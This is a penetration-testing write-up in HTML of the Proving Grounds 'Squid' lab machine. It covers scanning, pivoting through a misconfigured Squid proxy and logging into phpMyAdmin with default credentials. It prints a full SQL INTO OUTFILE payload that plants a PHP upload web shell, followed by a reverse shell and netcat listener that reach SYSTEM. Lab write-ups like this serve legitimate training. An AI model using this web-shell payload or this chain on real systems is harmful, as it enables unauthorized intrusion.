@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta name="description" content="Proving Grounds Squid Writeup - Rachel Murphy" />
+  <title>PG: Squid | Rachel Murphy</title>
+
+  <link rel="stylesheet" href="/assets/css/writeups.css">
+  <style>
+    img.screenshot {
+      max-width: 100%;
+      margin: 0.75rem 0;
+      border: 2px solid #39ff14;
+      border-radius: 6px;
+      display: block;
+    }
+    pre { background: rgba(15,23,36,0.9); padding: 1rem; border-radius: 6px; overflow-x: auto; }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="wrap">
+      <h1>Squid — Writeup</h1>
+      <p class="meta">Proving Grounds — Windows / Proxy Pivoting / Remote Code Execution</p>
+      <nav>
+        <ul class="main-nav">
+          <li><a href="/index.html">Home</a></li>
+          <li><a href="/writeups/index.html">Writeups</a></li>
+          <li><a href="/cheatsheets/cheatsheet.html">Cheatsheets</a></li>
+          <li><a href="/tools/index.html">Tools</a></li>
+          <li><a href="/about.html">About</a></li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+  <main class="wrap">
+
+    <!-- Machine Summary -->
+    <section class="machine-summary">
+      <h2>Machine Overview</h2>
+      <p><strong>Difficulty:</strong> Easy (some users rate as intermediate)</p>
+      <p><strong>Platform:</strong> Offensive Security Proving Grounds (Practice)</p>
+      <p><strong>Description:</strong> Squid is a Windows VM vulnerable to a misconfigured Squid proxy (port 3128). By pivoting through this proxy, an attacker can reach an internal WampServer instance running phpMyAdmin on port 8080, which is accessible with default credentials. Using phpMyAdmin, a malicious PHP shell can be written to disk, giving a SYSTEM shell.</p>
+    </section>
+
+    <h2>Initial Reconnaissance</h2>
+    <p>Start with a full Nmap scan to identify open ports and services:</p>
+    <pre><code>sudo nmap -sC -sV -vvv 192.168.236.189 -oN nmap-squid</code></pre>
+    <img class="screenshot" src="../images/Pasted image 20250706153026.png" alt="Nmap initial scan">
+    <p>The scan shows multiple open ports. The Squid proxy (4.14) on 3128 stands out:</p>
+    <img class="screenshot" src="../images/Pasted image 20250706153545.png" alt="All ports scan">
+
+    <h2>Enumerating SMB</h2>
+    <p>Checked SMB shares with NetExec; no accessible shares, but note the domain:</p>
+    <pre><code>nxc smb 192.168.236.189 -u 'administrator' -p 'administrator' --shares</code></pre>
+    <img class="screenshot" src="../images/Pasted image 20250706153314.png" alt="SMB shares">
+    <p>Domain discovered: <strong>SQUID</strong> (Windows 10 / Server 2019 Build 17763 x64). Always try multiple tools:</p>
+    <img class="screenshot" src="../images/Pasted image 20250706153432.png" alt="Another SMB check">
+
+    <h2>RPC Client</h2>
+    <p>Tested anonymous RPC access — no luck:</p>
+    <pre><code>rpcclient -U '' -N 192.168.236.189</code></pre>
+    <img class="screenshot" src="../images/Pasted image 20250706153638.png" alt="RPC client attempt">
+
+    <h2>Investigating Squid HTTP Proxy</h2>
+    <p>Squid 4.14 is running on port 3128. Quick exploit searches yielded nothing useful. Browsing to port 3128:</p>
+    <img class="screenshot" src="../images/Pasted image 20250706153926.png" alt="Browsing to port 3128">
+
+    <p>Ran feroxbuster for content discovery but got no results:</p>
+    <pre><code>feroxbuster -u http://squid:3128/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt</code></pre>
+
+    <p>Noticed a <em>mailto:webmaster</em> link but intercepting it in Burp failed; underscores not allowed:</p>
+    <img class="screenshot" src="../images/Pasted image 20250706154154.png" alt="mailto link">
+    <img class="screenshot" src="../images/Pasted image 20250706173629.png" alt="Burp error">
+    <img class="screenshot" src="../images/Pasted image 20250706173659.png" alt="Burp error underscores">
+    <img class="screenshot" src="../images/Pasted image 20250706173736.png" alt="FTP Gopher hint">
+    <img class="screenshot" src="../images/Pasted image 20250706173816.png" alt="FTP Gopher hint 2">
+
+    <p>Also tried wfuzz with API endpoints, but nothing significant:</p>
+    <pre><code>wfuzz -u 'http://squid:3128/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/api/actions.txt</code></pre>
+
+    <p>Tried curling localhost through the proxy — no connection:</p>
+    <pre><code>curl -x http://192.168.236.189:3128 http://127.0.0.1</code></pre>
+
+    <h2>Internal Scanning with Spose</h2>
+    <p>Used <a href="https://github.com/aancw/spose" target="_blank">Spose</a> (Squid Pivoting Open Port Scanner) from HackTricks to scan internal ports:</p>
+    <pre><code>python3 spose.py --proxy http://192.168.236.189:3128 --target 192.168.236.189</code></pre>
+    <img class="screenshot" src="../images/Pasted image 20250706191443.png" alt="Spose scan results">
+    <p>Configuring FoxyProxy in the browser allows pivoting through Squid:</p>
+    <img class="screenshot" src="../images/Pasted image 20250706191805.png" alt="FoxyProxy config">
+    <p>With proxy enabled, we can reach an internal service on port 8080:</p>
+    <img class="screenshot" src="../images/Pasted image 20250706191902.png" alt="Port 8080 website">
+
+    <h2>Exploiting WampServer / phpMyAdmin</h2>
+    <p>Browsing to port 8080 reveals WampServer and Adminer/phpMyAdmin:</p>
+    <img class="screenshot" src="../images/Pasted image 20250706192033.png" alt="WampServer">
+    <img class="screenshot" src="../images/Pasted image 20250706192251.png" alt="Adminer page">
+    <p>Found phpMyAdmin page too. Default creds (<code>root</code> / no password) worked:</p>
+    <img class="screenshot" src="../images/Pasted image 20250706194249.png" alt="phpMyAdmin login">
+    <img class="screenshot" src="../images/Pasted image 20250706194316.png" alt="phpMyAdmin logged in">
+
+    <p>Used a known phpMyAdmin exploit to write an uploader PHP shell to the web directory:</p>
+    <pre><code>SELECT  
+"&lt;?php echo '&lt;form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">';echo '&lt;input type=\"file\" name=\"file\" size=\"50\">&lt;input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\">&lt;/form>'; if( $_POST['_upl'] == \"Upload\" ) { if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '&lt;b>Upload Done.&lt;b>&lt;br>&lt;br>'; }else { echo '&lt;b>Upload Failed.&lt;/b>&lt;br>&lt;br>'; }}?"  
+INTO OUTFILE 'C:/wamp/www/uploader.php';</code></pre>
+    <img class="screenshot" src="../images/Pasted image 20250706210252.png" alt="SQL uploader">
+
+    <p>Browsing to <code>uploader.php</code> confirms the web shell:</p>
+    <img class="screenshot" src="../images/Pasted image 20250706210409.png" alt="Uploader page">
+
+    <p>Uploaded an Ivan Sincek reverse shell from <a href="https://www.revshells.com/" target="_blank">revshells.com</a> and started a listener:</p>
+    <pre><code>rlwrap nc -lvnp 9001</code></pre>
+    <img class="screenshot" src="../images/Pasted image 20250706211013.png" alt="Listener ready">
+
+    <p>Caught the reverse shell and got SYSTEM privileges:</p>
+    <img class="screenshot" src="../images/Pasted image 20250706211037.png" alt="Reverse shell">
+    <img class="screenshot" src="../images/Pasted image 20250706211055.png" alt="SYSTEM shell">
+
+  </main>
+</body>
+</html>
